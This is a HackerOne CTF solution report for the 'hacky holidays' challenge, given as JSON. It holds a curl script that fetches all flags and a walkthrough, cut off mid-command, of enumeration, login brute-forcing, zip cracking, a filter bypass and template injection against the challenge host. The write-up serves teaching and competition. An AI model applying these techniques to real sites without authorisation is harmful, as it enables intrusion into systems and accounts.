{"id":1065517,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMDY1NTE3","url":"https://hackerone.com/reports/1065517","title":"h1 hacky holidays CTF solution","state":"Closed","substate":"resolved","severity_rating":"critical","readable_substate":"Resolved","created_at":"2020-12-23T22:47:29.659Z","submitted_at":"2020-12-23T22:47:30.030Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"erbbysam","url":"/erbbysam","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":46757,"url":"https://hackerone.com/h1-ctf","handle":"h1-ctf","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/1hYGHKjWZv64FAEYq32nP1EU/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/1hYGHKjWZv64FAEYq32nP1EU/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"h1-ctf","twitter_handle":"Hacker0x01","website":"","about":"todayisnew reached 100K rep. Let's celebrate with a CTF!"}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2021-01-11T22:24:38.757Z","bug_reporter_agreed_on_going_public_at":"2021-01-11T22:19:40.859Z","team_member_agreed_on_going_public_at":"2021-01-11T22:24:38.679Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Simple script to print all the flags. Full solution to follow (want to spend more time writing this, but am racing to be first 10 submissions):\n```\necho \"Flag 1 -- robots.txt\"\ncurl https://hackyholidays.h1ctf.com/robots.txt 2\u003e/dev/null | grep flag\n\necho \"\"\necho \"Flag 2 -- js (descrambed -- flag{b7ebcb75-9100-4f91-8454-cfb9574459f7} )\"\ndiff \u003c(curl https://hackyholidays.h1ctf.com/assets/js/jquery.min.js 2\u003e/dev/null | js-beautify) \u003c(curl https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js 2\u003e/dev/null | js-beautify) | grep \"h1\"\n\necho \"\"\necho \"Flag 3 -- /people-rater\"\ncurl https://hackyholidays.h1ctf.com/people-rater/entry?id=eyJpZCI6MX0= 2\u003e/dev/null | grep flag\n\necho \"\"\necho \"Flag 4 -- /swag-shop\"\ncurl https://hackyholidays.h1ctf.com/swag-shop/api/user?uuid=C7DCCE-0E0DAB-B20226-FC92EA-1B9043 2\u003e/dev/null | grep flag\n\necho \"\"\necho \"Flag 5 -- /secure-login (access:computer)\"\nwget -q https://hackyholidays.h1ctf.com/my_secure_files_not_for_you.zip 2\u003e\u00261 \u003e /dev/null\nunzip -P hahahaha my_secure_files_not_for_you.zip 2\u003e\u00261 \u003e /dev/null\ncat flag.txt\nrm my_secure_files_not_for_you.zip\nrm flag.txt\nrm xxx.png\n\necho \"\"\necho \"Flag 6 -- /my-diary\"\ncurl https://hackyholidays.h1ctf.com/my-diary/?template=secretadminsecretadminadmin.php.php.php 2\u003e/dev/null | grep flag\n\necho \"\"\necho \"flag 7 -- /hate-mail-generator\"\ncurl -X POST https://hackyholidays.h1ctf.com/hate-mail-generator/new/preview --data 'preview_markup={{test}}{{email}}\u0026preview_data={\"test\":\"{{template:\",\"email\":\"38dhs_admins_only_header.html}}\"}' 2\u003e/dev/null | grep flag\n\n\necho \"\"\necho \"flag 8 -- /forum (grinch:BahHumbug)\"\ncurl https://hackyholidays.h1ctf.com/forum/3/2 -H 'Cookie: token=9F315347A655FFDAF70CD4A3529EE8A6' 2\u003e/dev/null | grep flag\n\necho \"\"\necho \"flag 9 -- /evil-quiz\"\ncurl -X POST https://hackyholidays.h1ctf.com/evil-quiz/admin --data 'username=admin\u0026password=S3creT_p4ssw0rd-%24' 2\u003e/dev/null | grep flag\n\necho \"\"\necho \"flag 10 -- /signup-manager (signup age=1e3, lastname=YYYYYYYYYYYYYYY)\"\ncurl https://hackyholidays.h1ctf.com/signup-manager/ -H 'Cookie: token=8fdaa7ac725a0f905e775a32a5cb7038' 2\u003e /dev/null | grep flag\n\necho \"\"\necho \"flag 11 -- /r3c0n_server_4fdk59 (SQLi, SQLi, ssrf, internal API -\u003egrinchadmin:s4nt4sucks)\"\ncurl -X POST https://hackyholidays.h1ctf.com/attack-box/login --data \"username=grinchadmin\u0026password=s4nt4sucks\" --cookie cookie.txt --cookie-jar cookie.txt 2\u003e/dev/null \u003e /dev/null\ncurl https://hackyholidays.h1ctf.com/attack-box/ --cookie cookie.txt --cookie-jar cookie.txt 2\u003e/dev/null | grep flag\n\n\necho \"\"\necho \"flag 12 -- /attack-box (MD5(mrgrinch463+target), DNS rebind -\u003e target=127.0.0.1)\"\ncurl https://hackyholidays.h1ctf.com/attack-box/challenge-completed-a3c589ba2709 --cookie cookie.txt --cookie-jar cookie.txt 2\u003e/dev/null | grep flag\nrm cookie.txt\n```\n\noutput:\n```\nFlag 1 -- robots.txt\nFlag: flag{48104912-28b0-494a-9995-a203d1e261e7}\n\nFlag 2 -- js (descrambed -- flag{b7ebcb75-9100-4f91-8454-cfb9574459f7} )\n\u003c         h1_0 = 'la',\n\u003c         h1_1 = '}',\n\u003c         h1_2 = '',\n\u003c         h1_3 = 'f',\n\u003c         h1_4 = 'g',\n\u003c         h1_5 = '{b7ebcb75',\n\u003c         h1_6 = '8454-',\n\u003c         h1_7 = 'cfb9574459f7',\n\u003c         h1_8 = '-9100-4f91-';\n\u003c     document.getElementById('alertbox').setAttribute('data-info', h1_2 + h1_3 + h1_0 + h1_4 + h1_2 + h1_5 + h1_8 + h1_6 + h1_7 + h1_1);\n\nFlag 3 -- /people-rater\n{\"id\":\"eyJpZCI6MX0=\",\"name\":\"The Grinch\",\"rating\":\"Amazing in every possible way!\",\"flag\":\"flag{b705fb11-fb55-442f-847f-0931be82ed9a}\"}\n\nFlag 4 -- /swag-shop\n{\"uuid\":\"C7DCCE-0E0DAB-B20226-FC92EA-1B9043\",\"username\":\"grinch\",\"address\":{\"line_1\":\"The Grinch\",\"line_2\":\"The Cave\",\"line_3\":\"Mount Crumpit\",\"line_4\":\"Whoville\"},\"flag\":\"flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}\"}\n\nFlag 5 -- /secure-login (access:computer)\nflag{2e6f9bf8-fdbd-483b-8c18-bdf371b2b004}\n\nFlag 6 -- /my-diary\n    \u003ch4 class=\"text-center\"\u003eflag{18b130a7-3a79-4c70-b73b-7f23fa95d395}\u003c/h4\u003e\n\nflag 7 -- /hate-mail-generator\n                \u003ch4\u003eflag{5bee8cf2-acf2-4a08-a35f-b48d5e979fdd}\u003c/h4\u003e\n\nflag 8 -- /forum (grinch:BahHumbug)\n                    \u003cdiv class=\"well well-sm\" style=\"margin:0;font-size:12px\"\u003eWe've launched our recon server, gathered intelligence and pin pointed Santa's location!\u003cbr\u003eNot long now until we find the IP addresses of his workshop and we can launch the DDoS attack!!!\u003cbr\u003e\u003cbr\u003e\u003cstrong\u003eflag{677db3a0-f9e9-4e7e-9ad7-a9f23e47db8b}\u003c/strong\u003e\u003c/div\u003e\n\nflag 9 -- /evil-quiz\n            \u003ch3 class=\"text-center\"\u003eflag{6e8a2df4-5b14-400f-a85a-08a260b59135}\u003c/h3\u003e\n\nflag 10 -- /signup-manager (signup age=1e3, lastname=YYYYYYYYYYYYYYY)\n                \u003cp class=\"text-center\"\u003eflag{99309f0f-1752-44a5-af1e-a03e4150757d}\u003c/p\u003e\n\nflag 11 -- /r3c0n_server_4fdk59 (SQLi, SQLi, ssrf, internal API -\u003egrinchadmin:s4nt4sucks)\n        \u003ch4 class=\"text-center\"\u003eflag{07a03135-9778-4dee-a83c-7ec330728e72}\u003c/h4\u003e\n\nflag 12 -- /attack-box (MD5(mrgrinch463+target), DNS rebind -\u003e target=127.0.0.1)\n        \u003cp\u003e\u003cstrong\u003eflag{ba6586b0-e482-41e6-9a68-caf9941b48a0}\u003c/strong\u003e\u003c/p\u003e\n```\n\n## Impact\n\ncritical, we must stop the Grinch!","weakness":{"id":9,"name":"Buffer Over-read"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2021-02-10T22:19:40.906Z","allow_singular_disclosure_after":-20962886.976864945,"singular_disclosure_allowed":true,"vote_count":2,"voters":["boy_child_","southernborn981"],"severity":{"rating":"critical","author_type":"User"},"structured_scope":{"databaseId":59882,"asset_type":"URL","asset_identifier":"hackyholidays.h1ctf.com","max_severity":"none"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":10208209,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Full writeup follows. Thank you for hosting this CTF!\n-Sam\n\n# Flag 1 -- robots.txt\nSimply visiting https://hackyholidays.h1ctf.com/robots.txt reveals the first flag!\n```\nUser-agent: *\nDisallow: /s3cr3t-ar3a\nFlag: flag{48104912-28b0-494a-9995-a203d1e261e7}\n```\n\n# Flag 2 -- JavaScript\nMost of the JavaScript on https://hackyholidays.h1ctf.com/ is externally hosted. There is one exception:\nhttps://hackyholidays.h1ctf.com/assets/js/jquery.min.js \n\nOn closer inspection, this jQuery version has been modified.\n\nThe difference becomes obvious when de-minified and diffed with an externally hosted copy:\n`diff \u003c(curl https://hackyholidays.h1ctf.com/assets/js/jquery.min.js 2\u003e/dev/null | js-beautify) \u003c(curl https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js 2\u003e/dev/null | js-beautify) | grep \"h1\"`\n(linux req: https://github.com/beautify-web/js-beautify)\n\nOutput:\n```\n\u003c         h1_0 = 'la',\n\u003c         h1_1 = '}',\n\u003c         h1_2 = '',\n\u003c         h1_3 = 'f',\n\u003c         h1_4 = 'g',\n\u003c         h1_5 = '{b7ebcb75',\n\u003c         h1_6 = '8454-',\n\u003c         h1_7 = 'cfb9574459f7',\n\u003c         h1_8 = '-9100-4f91-';\n\u003c     document.getElementById('alertbox').setAttribute('data-info', h1_2 + h1_3 + h1_0 + h1_4 + h1_2 + h1_5 + h1_8 + h1_6 + h1_7 + h1_1);\n```\n\nRunning this JavaScript reconstructs the flag:\n```\nh1_0  =  'la',\nh1_1  =  '}',\nh1_2  =  '',\nh1_3  =  'f',\nh1_4  =  'g',\nh1_5  =  '{b7ebcb75',\nh1_6  =  '8454-',\nh1_7  =  'cfb9574459f7',\nh1_8  =  '-9100-4f91-';\nconsole.log( h1_2  +  h1_3  +  h1_0  +  h1_4  +  h1_2  +  h1_5  +  h1_8  +  h1_6  +  h1_7  +  h1_1);\n```\nOutput:\n`flag{b7ebcb75-9100-4f91-8454-cfb9574459f7}`\n\n# Flag 3 -- /people-rater\n### Basic functionality\nhttps://hackyholidays.h1ctf.com/people-rater lists people. When you click a name, their rating is revealed.\n\nThis rating uses an API, for example:\nhttps://hackyholidays.h1ctf.com/people-rater/entry?id=eyJpZCI6Mn0=\nOutput:\n```\n{\n  \"id\": \"eyJpZCI6Mn0=\",\n  \"name\": \"Tea Avery\",\n  \"rating\": \"Awful\"\n}\n```\n\n### Hack\nNote the base64 `id` parameter above. The decoded base64 is `{\"id\":2}`. A careful examination of the page reveals that `{\"id\":1}` is skipped in the list of people.\n\nSending `{\"id\":1}` directly to the API reveals the flag:\nhttps://hackyholidays.h1ctf.com/people-rater/entry?id=eyJpZCI6MX0=\nOutput:\n```\n{\n  \"id\": \"eyJpZCI6MX0=\",\n  \"name\": \"The Grinch\",\n  \"rating\": \"Amazing in every possible way!\",\n  \"flag\": \"flag{b705fb11-fb55-442f-847f-0931be82ed9a}\"\n}\n```\n# Flag 4 -- /swag-shop\n### Basic functionality\nhttps://hackyholidays.h1ctf.com/swag-shop is a store where the user is not authenticated. No credentials are provided and the user cannot register.\n### Hack\nUsing dirsearch recursively on /swag-shop, we can identify API endpoints:\n```\n# python3 dirsearch.py -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,http://sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,.log,.xml,.js.,.json -r -u https://hackyholidays.h1ctf.com/swag-shop/\n\n _|. _ _  _  _  _ _|_    \n(_||| _) (/_(_|| (_| )\n\nExtensions: conf, config, bak, backup, swp, old, db, sql, asp, aspx, aspx~, asp~, py, py~, rb, rb~, php, php~, bkp, cache, cgi, csv, html, inc, jar, js, json, jsp, jsp~, lock, log, rar, sql.gz, http://sql.zip, sql.tar.gz, sql~, swp~, tar, tar.bz2, tar.gz, txt, wadl, zip, .log, .xml, .js., .json | HTTP method: get | Threads: 10 | Wordlist size: 23721 | Recursion level: 1\n\nTarget: https://hackyholidays.h1ctf.com/swag-shop/\n\n[18:17:29] Starting:\n[18:18:11] 200 -   23B  - /swag-shop/api\n[18:18:11] 200 -   23B  - /swag-shop/api/\n[18:18:52] Starting: api/\n[18:20:06] 200 -    2KB - /swag-shop/api/sessions/\n[18:20:06] 200 -    2KB - /swag-shop/api/sessions\n[18:20:14] 400 -   35B  - /swag-shop/api/user\n[18:20:14] 400 -   35B  - /swag-shop/api/user/\n\nTask Completed\n```\n\nUsing the /api/session endpoint, we can list presumably users connected to /swag-shop:\nhttps://hackyholidays.h1ctf.com/swag-shop/api/sessions\n\nOutput:\n```\n{\n  \"sessions\": [\n    \"eyJ1c2VyIjpudWxsLCJjb29raWUiOiJZelZtTlRKaVlUTmtPV0ZsWVRZMllqQTFaVFkxTkRCbE5tSTBZbVpqTW1ObVpHWXpNemcxTVdKa1pEY3lNelkwWlRGbFlqZG1ORFkzTkRrek56SXdNR05pWmpOaE1qUTNZMlJtWTJFMk4yRm1NemRqTTJJMFpXTmxaVFZrTTJWa056VTNNVFV3WWpka1l6a3lOV0k0WTJJM1pXWmlOamsyTjJOak9UazBNalU9In0=\",\n    \"eyJ1c2VyIjpudWxsLCJjb29raWUiOiJaak0yTXpOak0ySmtaR1V5TXpWbU1tWTJaamN4TmpkbE5ETm1aalF3WlRsbVkyUmhOall4TldNNVkyWTFaalkyT0RVM05qa3hNVFEyTnprMFptSXhPV1poTjJaaFpqZzBZMkU1TnprMU5UUTJNek16WlRjME1XSmxNelZoWkRBME1EVXdZbVEzTkRsbVpURTRNbU5rTWpNeE16VTBNV1JsTVRKaE5XWXpPR1E9In0=\",\n    \"eyJ1c2VyIjoiQzdEQ0NFLTBFMERBQi1CMjAyMjYtRkM5MkVBLTFCOTA0MyIsImNvb2tpZSI6Ik5EVTBPREk1TW1ZM1pEWTJNalJpTVdFME1tWTNOR1F4TVdFME9ETXhNemcyTUdFMVlXUmhNVGMwWWpoa1lXRTNNelUxTWpaak5EZzVNRFEyWTJKaFlqWTNZVEZoWTJRM1lqQm1ZVGs0TjJRNVpXUTVNV1E1T1dGa05XRTJNakl5Wm1aak16WmpNRFEzT0RrNVptSTRaalpqT1dVME9HSmhNakl3Tm1Wa01UWT0ifQ==\",\n    \"eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNRFJtWVRCaE4yRmlOalk1TUdGbE9XRm1ZVEU0WmpFMk4ySmpabVl6WldKa09UUmxPR1l3TWpJMU9HSXlOak0xT0RVME5qYzJZVGRsWlRNNE16RmlNMkkxTVRVek16VmlNakZoWXpWa01UYzRPREUzT0dNNFkySmxPVGs0TWpKbE1ESTJZalF6WkRReE1HTm1OVGcxT0RReFpqQm1PREJtWldReFptRTFZbUU9In0=\",\n    \"eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNMlEyTURJek5EZzVNV0UwTjJNM05ESm1OVEl5TkdNM05XVXhZV1EwTkRSbFpXSTNNVGc0TWpJM1pHUmtNVGxsWlRNMlpEa3hNR1ZsTldFd05tWmlaV0ZrWmpaaE9EZzRNRFkzT0RsbVpHUmhZVE0xWTJJeU1HVmhNakExTmpkaU5ERmpZekJoTVdRNE5EVTFNRGM0TkRFMVltSTVZVEpqT0RCa01qRm1OMlk9In0=\",\n    \"eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNV1kzTVRBek1UQmpaR1k0WkdNd1lqSTNaamsyWm1Zek1XSmxNV0V5WlRnMVl6RTBNbVpsWmpNd1ltSmpabVE0WlRVMFkyWXhZelZtWlRNMU4yUTFPRFkyWWpGa1ptRmlObUk1WmpJMU0yTTJNRFZpTmpBMFpqRmpORFZrTlRRNE4yVTJPRGRpTlRKbE1tRmlNVEV4T0RBNE1qVTJNemt4WldOaE5qRmtObVU9In0=\",\n    \"eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNRE00WXpoaU4yUTNNbVkwWWpVMk0yRmtabUZsTkRNd01USTVNakV5T0RobE5HRmtNbUk1T1RjeU1EbGtOVEpoWlRjNFlqVXhaakl6TjJRNE5tUmpOamcyTm1VMU16VmxPV0V6T1RFNU5XWXlPVGN3Tm1KbFpESXlORGd5TVRBNVpEQTFPVGxpTVRZeU5EY3pOakZrWm1VME1UZ3hZV0V3TURVMVpXTmhOelE9In0=\",\n    \"eyJ1c2VyIjpudWxsLCJjb29raWUiOiJPR0kzTjJFeE9HVmpOek0xWldWbU5UazJaak5rWmpJd00yWmpZemRqTVdOaE9EZzRORGhoT0RSbU5qSTBORFJqWlRkbFpUZzBaVFV3TnpabVpEZGtZVEpqTjJJeU9EWTVZamN4Wm1JNVpHUmlZVGd6WmpoaVpEVmlPV1pqTVRWbFpEZ3pNVEJrTnpObU9ESTBPVE01WkRNM1kySmpabVk0TnpFeU9HRTNOVE09In0=\"\n  ]\n}\n```\n\nThe session with the longest string clearly stands out. Decoded that base64 string:\n`{\"user\":\"C7DCCE-0E0DAB-B20226-FC92EA-1B9043\",\"cookie\":\"NDU0ODI5MmY3ZDY2MjRiMWE0MmY3NGQxMWE0ODMxMzg2MGE1YWRhMTc0YjhkYWE3MzU1MjZjNDg5MDQ2Y2JhYjY3YTFhY2Q3YjBmYTk4N2Q5ZWQ5MWQ5OWFkNWE2MjIyZmZjMzZjMDQ3ODk5ZmI4ZjZjOWU0OGJhMjIwNmVkMTY=\"}`\n\nVisiting the /api/user endpoint we are clearly missing API fields:\nhttps://hackyholidays.h1ctf.com/swag-shop/api/user\n\nOutput:\n`{\"error\":\"Missing required fields\"}`\n\nUsing the Burp Suite Param Miner Extension  (\"Guess GET parameters\" option), we can easily identify the missing required field. This identifies the \"secret\" parameter `uuid`!\n\nUsing the `uuid` provided above by the /api/session endpoint, we find the flag:\nhttps://hackyholidays.h1ctf.com/swag-shop/api/user?uuid=C7DCCE-0E0DAB-B20226-FC92EA-1B9043\nOutput:\n```\n{\n  \"uuid\": \"C7DCCE-0E0DAB-B20226-FC92EA-1B9043\",\n  \"username\": \"grinch\",\n  \"address\": {\n    \"line_1\": \"The Grinch\",\n    \"line_2\": \"The Cave\",\n    \"line_3\": \"Mount Crumpit\",\n    \"line_4\": \"Whoville\"\n  },\n  \"flag\": \"flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}\"\n}\n```\n\n# Flag 5 -- /secure-login\n### Basic functionality\nhttps://hackyholidays.h1ctf.com/secure-login is a basic login page.\n### Hack\nThe default error message says \"Invalid Username\".\n\nEnumerating usernames using Burp Suite Intruder, we see the username `access` receives a different response: \"Invalid Password\"\n(wordlist: https://github.com/jeanphorn/wordlist/blob/master/usernames.txt)\n\nEnumerating passwords using Burp Suite Intruder with the built-in password word list, reveals the password is `computer`.\n\nAfter logging in with`access:computer`, we receive the error message \"No Files To Download\".\n\nThe cookie set when logging in is:\n`securelogin=eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjpmYWxzZX0%3D;`\n\nDecoding this base64 reveals JSON with an \"admin\" field:\n`{\"cookie\":\"1b5e5f2c9d58a30af4e16a71a45d0172\",\"admin\":false}`\n\nChanging `admin` to `true` and reloading this page reveals a link to a file:\nhttps://hackyholidays.h1ctf.com/my_secure_files_not_for_you.zip\n\nThis zip file is password protected; however, we can brute-force this password:\n```\n# fcrackzip -u -v -D -p 'xato.txt' my_secure_files_not_for_you.zip\nfound file 'xxx.png', (size cp/uc 215105/215058, flags 9, chk 852f)\nfound file 'flag.txt', (size cp/uc     55/    43, flags 9, chk 82ca)\n\n\nPASSWORD FOUND!!!!: pw == hahahaha\n```\n(tool used: http://manpages.ubuntu.com/manpages/trusty/man1/fcrackzip.1.html)\n(word list used: https://github.com/danielmiessler/SecLists/blob/master/Passwords/xato-net-10-million-passwords-1000000.txt)\n\nWith this password we can print our flag:\n```\nwget -q https://hackyholidays.h1ctf.com/my_secure_files_not_for_you.zip 2\u003e\u00261 \u003e /dev/null\nunzip -P hahahaha my_secure_files_not_for_you.zip 2\u003e\u00261 \u003e /dev/null\ncat flag.txt\nrm my_secure_files_not_for_you.zip\nrm flag.txt\nrm xxx.png\n```\nOutput:\n`flag{2e6f9bf8-fdbd-483b-8c18-bdf371b2b004}`\n\n# Flag 6 -- /my-diary\n### Basic functionality\nhttps://hackyholidays.h1ctf.com/my-diary/ reveals the Grinch's diary! Notably, the page redirects to https://hackyholidays.h1ctf.com/my-diary/?template=entries.html\n\n### Hack\n\nGuessing other possible template file names, I reached:\nhttps://hackyholidays.h1ctf.com/my-diary/?template=index.php\n\nThis loads the PHP source code of base page (`index.php`) as a template and renders it as html, allowing us to see the PHP source code behind this page:\n```\n\u003c?php\nif( isset($_GET[\"template\"])  ){\n    $page = $_GET[\"template\"];\n    //remove non allowed characters\n    $page = preg_replace('/([^a-zA-Z0-9.])/','',$page);\n    //protect admin.php from being read\n    $page = str_replace(\"admin.php\",\"\",$page);\n    //I've changed the admin file to secretadmin.php for more security!\n    $page = str_replace(\"secretadmin.php\",\"\",$page);\n    //check file exists\n    if( file_exists($page) ){\n       echo file_get_contents($page);\n    }else{\n        //redirect to home\n        header(\"Location: /my-diary/?template=entries.html\");\n        exit();\n    }\n}else{\n    //redirect to home\n    header(\"Location: /my-diary/?template=entries.html\");\n    exit();\n}\n```\n\nWe clearly want to reach secretadmin.php; however. we must find a bypass for the two PHP string replacement functions (`str_replace`). We can accomplish this by leveraging the fact that these functions only are applied once, not recursively. Working backwards:\n```\nend goal: secretadmin.php\nstr_replace(\"secretadmin.php\",\"\",$page) bypass (secretadmin.php -\u003e secretsecretadmin.phpadmin.php): secretsecretadmin.phpadmin.php\nstr_replace(\"admin.php\",\"\",$page) bypass (admin.php -\u003e adminadmin.php.php): secretsecretadminadmin.php.phpadminadmin.php.php\n```\n\nUsing our bypass, we reveal the flag:\nhttps://hackyholidays.h1ctf.com/my-diary/?template=secretsecretadminadmin.php.phpadminadmin.php.php\n`flag{18b130a7-3a79-4c70-b73b-7f23fa95d395}`\n\n# Flag 7 -- /hate-mail-generator \n### Basic functionality\nhttps://hackyholidays.h1ctf.com/hate-mail-generator is a mail generator that uses a custom templating language.\n\n### Hack\nUsing dirsearch here reveals a `templates` directory:\n```\n# python3 dirsearch.py -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,http://sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,.log,.xml,.js.,.json -r -u https://hackyholidays.h1ctf.com/hate-mail-generator/\n\n _|. _ _  _  _  _ _|_    v\n(_||| _) (/_(_|| (_| )\n\nExtensions: conf, config, bak, backup, swp, old, db, sql, asp, aspx, aspx~, asp~, py, py~, rb, rb~, php, php~, bkp, cache, cgi, csv, html, inc, jar, js, json, jsp, jsp~, lock, log, rar, sql.gz, http://sql.zip, sql.tar.gz, sql~, swp~, tar, tar.bz2, tar.gz, txt, wadl, zip, .log, .xml, .js., .json | HTTP method: get | Threads: 10 | Wordlist size: 23721 | Recursion level: 1\n\nTarget: https://hackyholidays.h1ctf.com/hate-mail-generator/\n\n[03:50:37] Starting:\n[03:51:45] 200 -    2KB - /hate-mail-generator/new\n[03:52:00] 302 -    0B  - /hate-mail-generator/templates  -\u003e  /hate-mail-generator/templates/\n[03:52:00] 200 -  623B  - /hate-mail-generator/templates/\n[03:52:05] Starting: templates/\n\nTask Completed\n```\n\nThis directory is not properly protected. Visiting it reveals a directory list:\nhttps://hackyholidays.h1ctf.com/hate-mail-generator/templates/\n```\nIndex of /hate-mail-generator/templates/\n../\ncbdj3_grinch_header.html                                     20-Apr-2020 10:00                   -\ncbdj3_grinch_footer.html                                     20-Apr-2020 10:00                   -\n38dhs_admins_only_header.html                                21-Apr-2020 15:29                  46\n```\n\nWe want to access the template `38dhs_admins_only_header.html`. \n\nAttempting to preview a email containing the template `You do not have access to the file 38dhs_admins_only_header.html` reveals the following error:\nHTTP Request:\n```\nPOST /hate-mail-generator/new/preview HTTP/1.1\nHost: hackyholidays.h1ctf.com\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 73\nConnection: close\n\npreview_markup={{template:38dhs_admins_only_header.html}}\u0026preview_data={}\n```\n\nHTTP Response:\n```\nHTTP/1.1 200 OK\nServer: nginx/1.18.0 (Ubuntu)\nDate: Sat, 26 Dec 2020 03:58:48 GMT\nContent-Type: text/html; charset=UTF-8\nConnection: close\nContent-Length: 64\n\nYou do not have access to the file 38dhs_admins_only_header.html\n```\n\nWe can bypass this using the `preview_data` field which appears to pre-process the markup. This pre-process is done after the permission checks occur on the allowable templates, but before the templates are loaded!\n\nHTTP Request:\n```\nPOST /hate-mail-generator/new/preview HTTP/1.1\nHost: hackyholidays.h1ctf.com\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 110\nConnection: close\n\npreview_markup={{test}}{{email}}\u0026preview_data={\"test\":\"{{template:\",\"email\":\"38dhs_admins_only_header.html}}\"}\n```\n\nHTTP Response:\n```\nHTTP/1.1 200 OK\nServer: nginx/1.18.0 (Ubuntu)\nDate: Sat, 26 Dec 2020 04:00:50 GMT\nContent-Type: text/html; charset=UTF-8\nConnection: close\nContent-Length: 339\n\n\u003chtml\u003e\n\u003cbody\u003e\n\u003ccenter\u003e\n    \u003ctable width=\"700\"\u003e\n        \u003ctr\u003e\n            \u003ctd height=\"80\" width=\"700\" style=\"background-color: #64d23b;color:#FFF\" align=\"center\"\u003eGrinch Network Admins Only\u003c/td\u003e\n        \u003c/tr\u003e\n        \u003ctr\u003e\n            \u003ctd style=\"padding:20px 10px 20px 10px\"\u003e\n                \u003ch4\u003eflag{5bee8cf2-acf2-4a08-a35f-b48d5e979fdd}\u003c/h4\u003e\n```\n\n# Flag 8 -- /forum \n### Basic functionality\nhttps://hackyholidays.h1ctf.com/forum is a basic forum which contains posts from both `grinch` and `max`. There is also a login field and an admin area which we cannot access.\n### Hack\nUsing dirsearch, we can identify a `phpmyadmin` subfolder (phpMyAdmin is a MySQL database visualization tool) :\n```\n# python3 dirsearch.py -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,http://sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,.log,.xml,.js.,.json -u https://hackyholidays.h1ctf.com/forum/\n\n _|. _ _  _  _  _ _|_    v\n(_||| _) (/_(_|| (_| )\n\nExtensions: conf, config, bak, backup, swp, old, db, sql, asp, aspx, aspx~, asp~, py, py~, rb, rb~, php, php~, bkp, cache, cgi, csv, html, inc, jar, js, json, jsp, jsp~, lock, log, rar, sql.gz, http://sql.zip, sql.tar.gz, sql~, swp~, tar, tar.bz2, tar.gz, txt, wadl, zip, .log, .xml, .js., .json | HTTP method: get | Threads: 10 | Wordlist size: 23721\n\nTarget: https://hackyholidays.h1ctf.com/forum/\n\n[04:03:38] Starting:\n[04:03:41] 200 -    2KB - /forum/1\n[04:03:41] 200 -    2KB - /forum/2\n[04:04:40] 200 -    2KB - /forum/login\n[04:04:41] 200 -    2KB - /forum/login/\n[04:04:50] 200 -    9KB - /forum/phpmyadmin\n[04:04:50] 200 -    9KB - /forum/phpmyadmin/\n\nTask Completed\n```\nAdditionally, the source code of this forum was \"leaked\" online on github.com. Going through the commit history, we can see the database credentials were accidentally committed:\nhttps://github.com/Grinch-Networks/forum/commit/efb92ef3f561a957caad68fca2d6f8466c4d04ae\n\n\nLogging into https://hackyholidays.h1ctf.com/forum/phpmyadmin using `forum:6HgeAZ0qC9T6CQIqJpD` we can spot a user table which contains hashed passwords:\n```\nid\tusername\tpassword\t                        admin\n1\tgrinch\t    35D652126CA1706B59DB02C93E0C9FBF\t1\n2\tmax         388E015BC43980947FCE0E5DB16481D1\n```\n\nUsing a free MD5 hash reversal service online, we can identify that the grinch's password is `BahHumbug`:\nhttps://md5.gromweb.com/?md5=35D652126CA1706B59DB02C93E0C9FBF\n\nLogging in using `grinch:BahHumbug` reveals the flag:\n```\ncurl -X POST https://hackyholidays.h1ctf.com/forum/login --data 'username=grinch\u0026password=BahHumbug' --cookie cookie.txt --cookie-jar cookie.txt 2\u003e/dev/null \u003e /dev/null\ncurl https://hackyholidays.h1ctf.com/forum/3/2 --cookie cookie.txt --cookie-jar cookie.txt 2\u003e/dev/null | grep flag\nrm 